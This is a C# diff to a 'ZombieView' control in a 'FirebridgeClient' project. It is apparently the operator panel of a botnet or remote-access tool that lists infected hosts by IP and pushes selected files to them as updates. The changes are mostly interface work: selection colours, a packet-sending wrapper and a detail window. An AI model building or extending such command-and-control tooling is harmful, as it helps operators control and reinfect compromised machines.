@@ -11,6 +11,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using FirebridgeShared.Networking;
 using System.IO;
+using FirebridgeClient.Views;
 using FirebridgeShared.Models;
 
 namespace FirebridgeClient.Controls
@@ -19,6 +20,8 @@ namespace FirebridgeClient.Controls
     {
         Connection connection;
         private bool downloadedData = false;
+
+        public string Ip { get => _ip.Text; }
 
         public ZombieView(string ip)
         {
@@ -31,9 +34,15 @@ namespace FirebridgeClient.Controls
             Init();
         }
 
+        public void SendPacket(Packet packet)
+        {
+            connection.SendPacket(packet);
+        }
+
         private void Init()
         {
             connection.MessageRecieved += Connection_MessageRecieved;
+            detailView = new ZombieDetailView(this.connection);
         }
 
         public void AutoUpdate()
@@ -85,12 +94,26 @@ namespace FirebridgeClient.Controls
         public bool IsSelected
         {
             get => selected;
-            set => selected = value;
+            set
+            {
+                selected = value;
+
+                if (selected)
+                {
+                    this.BackColor = ColorTranslator.FromHtml("#ffb142");
+                }
+                else
+                {
+                    this.BackColor = ColorTranslator.FromHtml("#84817a");
+                }
+            }
         }
+
 
         private void _image_Click(object sender, EventArgs e)
         {
-            selected = !selected;
+            IsSelected = !selected;
+
         }
 
         public static int Width = 199;
@@ -102,7 +125,7 @@ namespace FirebridgeClient.Controls
             f.Multiselect = true;
             if (f.ShowDialog() == DialogResult.OK)
             {
-                var update = new UpdateModel() { Names = new List<string>(),  Data = new List<byte[]>() };
+                var update = new UpdateModel() { Names = new List<string>(), Data = new List<byte[]>() };
                 for (int i = 0; i < f.FileNames.Length; i++)
                 {
                     update.Data.Add(File.ReadAllBytes(f.FileNames[i]));
@@ -111,6 +134,12 @@ namespace FirebridgeClient.Controls
                 }
                 connection.SendPacket(new Packet() { Id = 4, Data = update });
             }
+        }
+
+        private ZombieDetailView detailView;
+        private void _buttonDetail_Click(object sender, EventArgs e)
+        {
+            detailView.Show();
         }
     }
 }
